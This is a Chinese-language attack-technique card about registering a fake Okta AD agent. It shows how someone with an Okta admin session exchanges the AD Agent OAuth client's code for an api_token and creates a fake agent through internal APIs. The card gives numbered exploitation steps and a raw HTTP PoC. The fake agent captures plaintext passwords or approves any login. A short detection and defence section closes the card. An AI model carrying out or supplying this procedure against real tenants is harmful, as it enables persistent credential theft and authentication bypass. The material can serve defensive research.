---
id: cloud-cloud-iam-okta-fake-ad-agent-admin-oauth-token-registration
title: Okta 管理员伪造 AD Agent：借 AD Agent OAuth 客户端换取 api_token，内部 API 注册假连接器后捕获/批准任意认证
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: okta-fake-ad-agent-oauth-registration
aliases:
- 假 Okta AD Agent
- oauth api_token
- 伪造连接器
- Okta 内部 API
- agent 注册
- cappT0Hfy97F1BoO1UTR
tags:
- okta
- cloud-iam
- oauth
- ad-agent
- persistence
- authentication-bypass
- admin-abuse
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V433
  verified_at: '2026-11-09T20:13:08+08:00'
  notes: 已对照原文与截图核对：OAuth 同意页权限(Register a new Okta Agent/manage app instance/Access Okta Agent APIs/create app instance properties)、redirect 回调 /oauth-response?code=...&expires_in=600、POST /oauth2/token grant_type=api_token、内部 API 建 AD 域/建 agent/actionResult INIT 流程均与原文一致；不依赖现成 AgentToken 的定位正确。未验证点：api_token 换取与内部 API 注册需实际 Okta 管理员租户复测。
---

## 一句话结论

拿到一个有权限的 Okta 账户后，不必有现成 agent token：用 Okta AD Agent 的 OAuth 客户端走 `authorize→code→/oauth2/token`（`grant_type=api_token`）换到 api_token，再通过内部 API 关联 AD 域、注册一个名为 DC02 的假 agent 并初始化，就能像真实 agent 一样接收登录请求、捕获明文口令或回 `SUCCESS` 批准任意认证。

## 原理

- Okta AD Agent 本身是一个 OAuth 客户端（示例 client_id 形如 `cappT0Hfy97F1BoO1UTR`），具备“注册新 Okta Agent、管理 app 实例属性、访问 Agent API、创建 app 实例属性”等权限。管理员在浏览器登录后访问 `oauth2/authorize`（`response_type=code`、`redirect_uri=/oauth-response`、`prompt=select_account`）并同意，即得到一次性 code（示例有效期 600 秒）。
- 用该 code 向 `POST /oauth2/token` 提交 `grant_type=api_token&code=<code>&client_id=<client_id>`（User-Agent 伪装成 `Okta AD Agent/3.16.0`）即可换取 `api_token`。
- 内部 API 允许 token 持有者创建 AD 域链接：`POST /api/1/internal/app/activedirectory/`，XML 体为 `<domain name="<AD域名>"/>`，返回 `<activeDirectory id="...">`；再 `POST .../activedirectory/<adid>/agent?name=DC02` 创建 agent，返回 `<agent id="...">`。
- 最后 `POST .../agent/<agentid>/actionResult?agentVersion=3.13.0.0` 提交 `<type>INIT</type><status>SUCCESS</status>` 的 `agentActionResult`，假 agent 完成初始化。此后它与真实 agent 地位相同：可调 `nextAction` 拿到用户认证的明文口令，也可回 `actionResult SUCCESS` 批准任意登录。
- 之所以成立：注册 agent 属于管理员权限内的产品功能，内部 API 只校验 token 与 ID 绑定，不要求请求来自真实安装的 agent 主机；因此这是管理员级持久化后门，而非某个软件漏洞。

## 触发条件

- 拥有能登录 Okta 并同意该 OAuth 请求的管理员账户/会话（注册 agent 的权限）。
- 租户启用 AD 集成/允许 agent 注册；攻击者能访问 Okta API。
- 能完成浏览器 OAuth 流程（或直接持有可用的管理员会话与 code）。

## 利用步骤

1. 管理员浏览器访问 `https://<tenant>.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=<AD_AGENT_CLIENT_ID>&prompt=select_account`，在权限提示中点击允许（提示包含注册新 Okta Agent、管理 app 实例等权限）。
2. 从重定向地址 `/oauth-response?code=<code>&expires_in=600` 取出 code。
3. `POST /oauth2/token`，体为 `grant_type=api_token&code=<code>&client_id=<AD_AGENT_CLIENT_ID>`，带上 Okta AD Agent 的 User-Agent；响应 JSON 返回 `api_token`。
4. `POST /api/1/internal/app/activedirectory/`，XML `<domain name="lab.local"/>`，记下返回的 activeDirectory id。
5. `POST /api/1/internal/app/activedirectory/<adid>/agent?name=DC02`，记下返回的 agent id。
6. `POST /api/1/internal/app/activedirectory/<adid>/agent/<agentid>/actionResult?agentVersion=3.13.0.0`，提交 `INIT/SUCCESS` 的 agentActionResult 完成初始化。
7. 假 agent 就绪：用 `nextAction` 捕获用户认证的明文用户名/口令，或用 `actionResult SUCCESS` 让任意用户通过 Okta 认证；可用工具以 token 模式自动化。

## PoC

```http
POST /oauth2/token HTTP/1.1
Host: <tenant>.okta.com
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded

grant_type=api_token&code=<CODE>&client_id=<AD_AGENT_CLIENT_ID>

POST /api/1/internal/app/activedirectory/ HTTP/1.1
Host: <tenant>.okta.com
Authorization: SSWS <API_TOKEN>
Content-Type: application/xml

<domain name="lab.local" />

POST /api/1/internal/app/activedirectory/<ADID>/agent?name=DC02 HTTP/1.1
Host: <tenant>.okta.com
Authorization: SSWS <API_TOKEN>

POST /api/1/internal/app/activedirectory/<ADID>/agent/<AGENTID>/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: <tenant>.okta.com
Authorization: SSWS <API_TOKEN>
Content-Type: text/xml

<agentActionResult>
  <type>INIT</type>
  <status>SUCCESS</status>
</agentActionResult>
```

## 变体与关联

- 关联 [[cloud-cloud-iam-okta-ad-agent-token-dpapi-credential-capture-skeleton-key]]：那条路是偷现成 agent 的 AgentToken；本卡是用管理员资格注册新 agent，前置条件与痕迹不同。
- 关联 [[cloud-cloud-iam-okta-delegated-auth-silver-ticket-aes-any-user]]：另一条不通过 agent 的任意用户认证路径。
- 边界：OAuth code 通常 10 分钟内过期且一次性；管理员账户启用 MFA/条件访问时需先通过其登录；租户若限制 agent 注册或启用更强的管理员审批，流程会被阻断。

## 检测与防御

- Okta 系统日志：审计新的 AD agent 注册、`grant_type=api_token` 的令牌签发、AD Agent OAuth 客户端的管理员同意记录，以及来自陌生 IP 的 agent 长轮询。
- 权限治理：最小化可注册 agent 的管理员数量；对 agent 注册启用审批/告警；定期核对 agent 列表与真实主机清单。
- 主机/网络：真实 agent 流量应只来自已知主机与出口 IP；出现第二个数据中心/新 agent id 时立即核查并撤销。
- 凭据：轮换 API token/AgentToken，撤销未知 agent；启用 Okta 的审计告警与 SIEM 关联规则。
